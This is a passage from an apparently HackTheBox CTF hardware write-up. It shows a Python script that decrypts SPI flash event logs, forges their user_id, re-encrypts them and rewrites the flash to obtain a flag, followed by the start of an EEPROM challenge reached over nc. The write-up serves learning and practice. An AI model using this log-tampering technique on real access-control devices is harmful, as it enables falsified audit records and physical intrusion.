</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">enc_log</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0xc</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Invalid log (data in the specified address is clean)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Decrypt encrypted event_log with the key that we retrieved</span>
</span></span><span class="line"><span class="cl">    <span class="n">raw_log</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">enc_log</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="n">crc32</span><span class="p">(</span><span class="n">raw_log</span><span class="p">)</span> <span class="o">==</span> <span class="n">crc32_log</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Parse log to help our life easier</span>
</span></span><span class="line"><span class="cl">    <span class="n">event_log</span> <span class="o">=</span>  <span class="n">parse_log</span><span class="p">(</span><span class="n">raw_log</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">event_log</span><span class="p">,</span> <span class="n">crc32_log</span><span class="p">,</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">event_logs</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="c1"># There are 160 logs based on testing manually </span>
</span></span><span class="line"><span class="cl"><span class="c1"># (also the event log for user_id 0x5244 start from idx 156)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Search for user_id 0x5244 event_logs&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">156</span><span class="p">,</span> <span class="mi">160</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;----&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;log-</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">event_log</span><span class="p">,</span> <span class="n">crc32_log</span><span class="p">,</span> <span class="n">is_valid</span> <span class="o">=</span> <span class="n">read_event_log</span><span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">is_valid</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span>
</span></span><span class="line"><span class="cl">    <span class="n">event_log</span><span class="o">.</span><span class="n">out</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">event_log</span><span class="o">.</span><span class="n">user_id</span> <span class="o">==</span> <span class="mh">0x5244</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">event_logs</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">event_log</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;---&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Notes that later, we need to erase the whole sector of spiflash (4096 bytes)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># before we can overwrite the event_log of user id 0x5244.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># So, let&#39;s recover the data first.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Read raw data 160 * 0x10 starting from address 0</span>
</span></span><span class="line"><span class="cl"><span class="n">raw_data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">exchange</span><span class="p">([</span><span class="n">CMD_READ</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">],</span> <span class="mi">160</span><span class="o">*</span><span class="mh">0x10</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># From preious output, we know that data 156-159 contains user_id 0x5244.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Let&#39;s alter it</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Start constructing new data...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">altered_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">event_idx</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">event_logs</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">val</span><span class="o">.</span><span class="n">user_id</span> <span class="o">=</span> <span class="mh">0x23f</span> <span class="c1"># Change user_id</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># serialize and encrypt</span>
</span></span><span class="line"><span class="cl">    <span class="n">new_data</span> <span class="o">=</span> <span class="n">val</span><span class="o">.</span><span class="n">serialize</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">crc_32_bytes</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">crc32</span><span class="p">(</span><span class="n">new_data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">enc_data</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">new_data</span><span class="p">)</span><span class="o">+</span><span class="n">crc_32_bytes</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">enc_data</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x10</span>
</span></span><span class="line"><span class="cl">    <span class="n">altered_data</span><span class="o">+=</span><span class="n">enc_data</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">new_raw_data</span> <span class="o">=</span> <span class="n">raw_data</span><span class="p">[:</span><span class="mi">156</span><span class="o">*</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">+</span> <span class="n">altered_data</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">raw_data</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">new_raw_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># print(new_raw_data)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Start alter data...</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Erase sector</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Erase sector 0...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">exchange</span><span class="p">([</span><span class="n">CMD_WRITE_ENABLE</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">exchange</span><span class="p">([</span><span class="n">CMD_SECTOR_ERASE</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">])</span> <span class="c1"># Delete sector 0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Assertion check</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Assert that sector 0 is erased&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">raw_data</span> <span class="o">=</span> <span class="n">read_data</span><span class="p">([</span><span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">],</span> <span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">raw_data</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xFF</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x10</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Start rewrite the spiflash data</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Start rewrite data. We can only write 256 bytes per cmd&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">new_raw_data</span><span class="p">),</span> <span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Writing data[</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">:</span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">256</span><span class="si">}</span><span class="s1">]...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="p">[</span><span class="n">b</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">p32</span><span class="p">(</span><span class="n">i</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">:]]</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="p">[</span><span class="n">b</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">new_raw_data</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">256</span><span class="p">]]</span>
</span></span><span class="line"><span class="cl">    <span class="n">exchange</span><span class="p">([</span><span class="n">CMD_WRITE_ENABLE</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">exchange</span><span class="p">([</span><span class="n">CMD_PAGE_PROGRAM</span><span class="p">]</span><span class="o">+</span><span class="n">addr</span><span class="o">+</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Print flag</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Fetch flag :)&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">read_data</span><span class="p">(</span><span class="n">FLAG_ADDRESS</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">flag</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After successfully modifying the event logs, as per the challenge setup and the provided <code>client.py</code>, the flag was made available at the address <code>[0x52, 0x52, 0x52]</code>. Heres how it looked when we executed the script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">python</span> <span class="n">client</span><span class="o">.</span><span class="n">py</span>
</span></span><span class="line"><span class="cl"><span class="n">jedec_id</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xef</span><span class="s1">@</span><span class="se">\x18</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;9</span><span class="se">\xde</span><span class="s1">j</span><span class="se">\x99</span><span class="s1">&amp;]</span><span class="se">\xfe\x89</span><span class="s1">l</span><span class="se">\x06</span><span class="s1">HS&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">Search</span> <span class="k">for</span> <span class="n">user_id</span> <span class="mh">0x5244</span> <span class="n">event_logs</span>
</span></span><span class="line"><span class="cl"><span class="o">----</span>
</span></span><span class="line"><span class="cl"><span class="nb">log</span><span class="o">-</span><span class="mf">156.</span><span class="o">..</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">timestamp</span> <span class="p">:</span> <span class="mi">1712702755</span> <span class="p">(</span><span class="mi">2024</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">10</span> <span class="mi">05</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">55</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">event_type</span><span class="p">:</span> <span class="mi">214</span>
</span></span><span class="line"><span class="cl">        <span class="n">user_id</span>   <span class="p">:</span> <span class="mh">0x5244</span>
</span></span><span class="line"><span class="cl">        <span class="n">method</span>    <span class="p">:</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="n">status</span>    <span class="p">:</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">----</span>
</span></span><span class="line"><span class="cl"><span class="nb">log</span><span class="o">-</span><span class="mf">157.</span><span class="o">..</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">timestamp</span> <span class="p">:</span> <span class="mi">1712714687</span> <span class="p">(</span><span class="mi">2024</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">10</span> <span class="mi">09</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mi">47</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">event_type</span><span class="p">:</span> <span class="mi">187</span>
</span></span><span class="line"><span class="cl">        <span class="n">user_id</span>   <span class="p">:</span> <span class="mh">0x5244</span>
</span></span><span class="line"><span class="cl">        <span class="n">method</span>    <span class="p">:</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">        <span class="n">status</span>    <span class="p">:</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">----</span>
</span></span><span class="line"><span class="cl"><span class="nb">log</span><span class="o">-</span><span class="mf">158.</span><span class="o">..</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">timestamp</span> <span class="p">:</span> <span class="mi">1712723427</span> <span class="p">(</span><span class="mi">2024</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">10</span> <span class="mi">11</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">27</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">event_type</span><span class="p">:</span> <span class="mi">187</span>
</span></span><span class="line"><span class="cl">        <span class="n">user_id</span>   <span class="p">:</span> <span class="mh">0x5244</span>
</span></span><span class="line"><span class="cl">        <span class="n">method</span>    <span class="p">:</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">        <span class="n">status</span>    <span class="p">:</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">----</span>
</span></span><span class="line"><span class="cl"><span class="nb">log</span><span class="o">-</span><span class="mf">159.</span><span class="o">..</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">timestamp</span> <span class="p">:</span> <span class="mi">1712750575</span> <span class="p">(</span><span class="mi">2024</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">10</span> <span class="mi">19</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mi">55</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">event_type</span><span class="p">:</span> <span class="mi">214</span>
</span></span><span class="line"><span class="cl">        <span class="n">user_id</span>   <span class="p">:</span> <span class="mh">0x5244</span>
</span></span><span class="line"><span class="cl">        <span class="n">method</span>    <span class="p">:</span> <span class="mi">3</span>
</span></span><span class="line"><span class="cl">        <span class="n">status</span>    <span class="p">:</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">---</span>
</span></span><span class="line"><span class="cl"><span class="n">Start</span> <span class="n">constructing</span> <span class="n">new</span> <span class="n">data</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">Erase</span> <span class="n">sector</span> <span class="mf">0.</span><span class="o">..</span>
</span></span><span class="line"><span class="cl"><span class="n">Assert</span> <span class="n">that</span> <span class="n">sector</span> <span class="mi">0</span> <span class="n">is</span> <span class="n">erased</span>
</span></span><span class="line"><span class="cl"><span class="n">Start</span> <span class="n">rewrite</span> <span class="n">data</span><span class="o">.</span> <span class="n">We</span> <span class="n">can</span> <span class="n">only</span> <span class="n">write</span> <span class="mi">256</span> <span class="n">bytes</span> <span class="n">per</span> <span class="n">cmd</span>
</span></span><span class="line"><span class="cl"><span class="n">Writing</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">256</span><span class="p">]</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">Writing</span> <span class="n">data</span><span class="p">[</span><span class="mi">256</span><span class="p">:</span><span class="mi">512</span><span class="p">]</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">Writing</span> <span class="n">data</span><span class="p">[</span><span class="mi">512</span><span class="p">:</span><span class="mi">768</span><span class="p">]</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">Writing</span> <span class="n">data</span><span class="p">[</span><span class="mi">768</span><span class="p">:</span><span class="mi">1024</span><span class="p">]</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">Writing</span> <span class="n">data</span><span class="p">[</span><span class="mi">1024</span><span class="p">:</span><span class="mi">1280</span><span class="p">]</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">Writing</span> <span class="n">data</span><span class="p">[</span><span class="mi">1280</span><span class="p">:</span><span class="mi">1536</span><span class="p">]</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">Writing</span> <span class="n">data</span><span class="p">[</span><span class="mi">1536</span><span class="p">:</span><span class="mi">1792</span><span class="p">]</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">Writing</span> <span class="n">data</span><span class="p">[</span><span class="mi">1792</span><span class="p">:</span><span class="mi">2048</span><span class="p">]</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">Writing</span> <span class="n">data</span><span class="p">[</span><span class="mi">2048</span><span class="p">:</span><span class="mi">2304</span><span class="p">]</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">Writing</span> <span class="n">data</span><span class="p">[</span><span class="mi">2304</span><span class="p">:</span><span class="mi">2560</span><span class="p">]</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="n">Fetch</span> <span class="n">flag</span> <span class="p">:)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;HTB{n07h1n9_15_53cu23_w17h_phy51c41_4cc355!@}</span><span class="se">\xff\xff\xff</span><span class="s1">&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><strong>Flag: HTB{n07h1n9_15_53cu23_w17h_phy51c41_4cc355!@}</strong></p></blockquote>
<h2 id="the-prom-medium">The PROM [medium]</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">After entering the door, you navigate through the building, evading guards, and quickly locate the server room in the basement. Despite easy bypassing of security measures and cameras, laser motion sensors pose a challenge. They&rsquo;re controlled by a small 8-bit computer equipped with AT28C16 a well-known EEPROM as its control unit. Can you uncover the EEPROM&rsquo;s secrets?</div>
        </div>
    </div>
<h3 id="initial-analysis-5">Initial Analysis</h3>
<p>In this challenge, while no files were provided, we can spawn an instance for interacting with the specified hardware, the AT28C16 EEPROM. Our first step was to establish a connection to this instance.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc 83.136.250.41 52004
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      AT28C16 EEPROMs
</span></span><span class="line"><span class="cl">       _____   _____
</span></span><span class="line"><span class="cl">      |     \_/     |
</span></span><span class="line"><span class="cl">A7   [| 1        24 |] VCC
</span></span><span class="line"><span class="cl">A6   [| 2        23 |] A8
</span></span><span class="line"><span class="cl">A5   [| 3        22 |] A9
</span></span><span class="line"><span class="cl">A4   [| 4        21 |] !WE
</span></span><span class="line"><span class="cl">A3   [| 5        20 |] !OE
</span></span><span class="line"><span class="cl">A2   [| 6        19 |] A10
</span></span><span class="line"><span class="cl">A1   [| 7        18 |] !CE
</span></span><span class="line"><span class="cl">A0   [| 8        17 |] I/O7
</span></span><span class="line"><span class="cl">I/O0 [| 9        16 |] I/O6
</span></span><span class="line"><span class="cl">I/O1 [| 10       15 |] I/O5
</span></span><span class="line"><span class="cl">I/O2 [| 11       14 |] I/O4
</span></span><span class="line"><span class="cl">GND  [| 12       13 |] I/O3
</span></span><span class="line"><span class="cl">      |_____________|
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; help
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Usage:
</span></span><span class="line"><span class="cl">  method_name(argument)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">EEPROM COMMANDS:
</span></span><span class="line"><span class="cl">  set_address_pins(address)  Sets the address pins from A10 to A0 to the specified values.
</span></span><span class="line"><span class="cl">  set_ce_pin(volts)          Sets the CE (Chip Enable) pin voltage to the specified value.
</span></span><span class="line"><span class="cl">  set_oe_pin(volts)          Sets the OE (Output Enable) pin voltage to the specified value.
</span></span><span class="line"><span class="cl">  set_we_pin(volts)          Sets the WE (Write Enable) pin voltage to the specified value.
</span></span><span class="line"><span class="cl">  set_io_pins(data)          Sets the I/O (Input/Output) pins to the specified data values.
</span></span><span class="line"><span class="cl">  read_byte()                Reads a byte from the memory at the current address.
</span></span><span class="line"><span class="cl">  write_byte()               Writes the current data to the memory at the current address.
</span></span><span class="line"><span class="cl">  help                       Displays this help menu.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Examples:
</span></span><span class="line"><span class="cl">  set_ce_pin(3.5)
</span></span><span class="line"><span class="cl">  set_io_pins([0, 5.1, 3, 0, 0, 3.1, 2, 4.2])
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>The connection provided us with a list of available commands, indicating that the EEPROM emulator is storing the flag we&rsquo;re after.</p>
<h3 id="solution-5">Solution</h3>
<p>As usual, I began by searching the EEPROM&rsquo;s documentation. I found a good <a href="http://cva.stanford.edu/classes/cs99s/datasheets/at28c16.pdf" target="_blank" rel="noopener noreffer ">resource</a> that detailed the correct interaction methods with the EEPROM. According to the document:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">READ: The AT28C16 is accessed like a Static RAM.
</span></span><span class="line"><span class="cl">When CE and OE are low and WE is high, the data stored
</span></span><span class="line"><span class="cl">at the memory location determined by the address pins is
</span></span><span class="line"><span class="cl">asserted on the outputs. The outputs are put in a high
</span></span><span class="line"><span class="cl">impedance state whenever CE or OE is high. This dual line
</span></span><span class="line"><span class="cl">control gives designers increased flexibility in preventing
</span></span><span class="line"><span class="cl">bus contention. 
</span></span></code></pre></td></tr></table>
</div>
</div><p>So, to read data, we need to:</p>
<ul>
<li>Use <code>set_ce_pin(0)</code> to set the Chip Enable (CE) pin low,</li>
<li>Use <code>set_oe_pin(0)</code> to set the Output Enable (OE) pin low,</li>
<li>Use <code>set_we_pin(5)</code> to set the Write Enable (WE) pin high,</li>
<li>And use <code>set_address_pins(addr)</code> to choose the reading address.
<ul>
<li>For setting an address, for instance, if we aim to read from address <code>0x2</code>, we need to set the <code>A1</code> pin high (e.g., to <code>5V</code>), and the rest low, to represent <code>0x2</code> in binary (<code>00000000010</code>).</li>
<li>The EEPROM&rsquo;s address space spans 11 bits (<code>A10 - A0</code>), ranging from <code>0x000</code> to <code>0x7ff</code>.</li>
</ul>
</li>
</ul>
<p>Below is the script that we create to read the data:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
